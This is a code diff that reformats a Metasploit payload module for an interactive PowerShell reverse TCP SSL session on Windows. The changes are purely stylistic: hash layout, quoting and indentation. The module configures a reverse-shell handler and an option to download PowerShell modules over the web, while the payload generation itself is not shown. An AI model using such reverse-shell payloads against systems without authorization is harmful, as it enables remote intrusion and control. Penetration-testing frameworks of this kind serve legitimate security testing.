@@ -5,7 +5,6 @@
 require 'rex/powershell'
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -13,37 +12,38 @@ module MetasploitModule
   include Msf::Payload::Windows::Powershell
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP SSL',
-      'Description'   => 'Interacts with a powershell session on an established SSL socket connection',
-      'Author'        =>
-        [
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows Interactive Powershell Session, Reverse TCP SSL',
+        'Description' => 'Interacts with a powershell session on an established SSL socket connection',
+        'Author' => [
           'Ben Turner', # benpturner
           'Dave Hardy' # davehardy20
         ],
-      'References'    =>
-        [
+        'References' => [
           ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'windows',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcpSsl,
-      'Session'       => Msf::Sessions::PowerShell,
-      'RequiredCmd'   => 'generic',
-      'Payload'       =>
-        {
-          'Offsets' => { },
+        'License' => MSF_LICENSE,
+        'Platform' => 'windows',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcpSsl,
+        'Session' => Msf::Sessions::PowerShell,
+        'RequiredCmd' => 'generic',
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
-      register_options(
+      )
+    )
+    register_options(
       [
-        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules separated by a comma to download over the web", nil ]),
-      ])
+        OptString.new('LOAD_MODULES', [ false, 'A list of powershell modules separated by a comma to download over the web', nil ]),
+      ]
+    )
   end
 
   def generate
-    generate_powershell_code("SSL")
+    generate_powershell_code('SSL')
   end
 end
